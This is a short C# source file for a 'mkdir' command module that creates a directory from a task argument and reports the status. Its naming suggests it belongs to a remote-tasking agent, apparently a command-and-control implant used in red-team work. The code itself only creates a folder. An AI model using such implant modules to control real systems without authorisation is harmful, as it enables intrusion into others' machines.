using System;
using System.IO;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands
{
    internal class mkdir : EngineerCommand
    {
        public override string Name => "mkdir";

        public override async Task Execute(EngineerTask task)
        {
            task.Arguments.TryGetValue("/path", out string path);
            if (Directory.Exists(path))
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "Directory already exists",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                return;
            }
            //try to create directory 
            try
            {
                Directory.CreateDirectory(path);
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Directory created",task,EngTaskStatus.Complete,TaskResponseType.String);
            }
            catch (Exception e)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + e.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
            }

        }
    }
}
